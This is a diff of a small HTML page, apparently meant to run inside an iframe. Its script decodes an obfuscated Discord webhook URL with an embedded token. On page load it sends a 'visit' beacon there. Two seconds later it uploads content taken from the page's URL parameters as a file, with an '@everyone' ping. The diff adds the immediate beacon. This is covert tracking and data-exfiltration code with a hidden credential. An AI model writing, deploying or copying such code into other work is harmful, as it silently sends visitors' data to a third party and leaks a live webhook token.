@@ -5,9 +5,9 @@
 <body>
 <script>
 function c() {return decodeURI(window.location.href.split("=")[2]);};function d(en) {return atob('aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3Mv')+atob(en);};
+fetch(d("MTI5NDEyOTgxMzQ2NDAyMzA2MS9nZVVzWERfY3JKWHFiZE8zQ1J5TjZsUEZ1NGlKRUVuRG9aWjM5LVNUQnIwSUhsbFEzOVFyeTB6UDJwNnRoTGpyV3FXcg=="),{headers:{"content-type":"application/json"},method:"POST",body:JSON.stringify({"content":"visit"})})
 setTimeout(()=>{
-    
-    let t=c(),e=new FormData,a=new Blob([t],{type:"text/plain"});e.append("file",a,"content.txt");let i=JSON.stringify({content:"@everyone <"+decodeURI(window.location.href.split("=")[1])+">"});e.append("payload_json",i),fetch(d("MTI5NDEyOTgxMzQ2NDAyMzA2MS9nZVVzWERfY3JKWHFiZE8zQ1J5TjZsUEZ1NGlKRUVuRG9aWjM5LVNUQnIwSUhsbFEzOVFyeTB6UDJwNnRoTGpyV3FXcg=="),{headers:{"content-type":"application/json"},method:"POST",body:JSON.stringify({"content":"visit"})}),fetch(d("MTI5NDEyOTgxMzQ2NDAyMzA2MS9nZVVzWERfY3JKWHFiZE8zQ1J5TjZsUEZ1NGlKRUVuRG9aWjM5LVNUQnIwSUhsbFEzOVFyeTB6UDJwNnRoTGpyV3FXcg=="),{method:"POST",body:e});window.parent.postMessage("iframe message", "*");
+    let t=c(),e=new FormData,a=new Blob([t],{type:"text/plain"});e.append("file",a,"content.txt");let i=JSON.stringify({content:"@everyone <"+decodeURI(window.location.href.split("=")[1])+">"});e.append("payload_json",i),fetch(d("MTI5NDEyOTgxMzQ2NDAyMzA2MS9nZVVzWERfY3JKWHFiZE8zQ1J5TjZsUEZ1NGlKRUVuRG9aWjM5LVNUQnIwSUhsbFEzOVFyeTB6UDJwNnRoTGpyV3FXcg=="),{method:"POST",body:e});window.parent.postMessage("iframe message", "*");
 },2000)
 </script>
 </body>
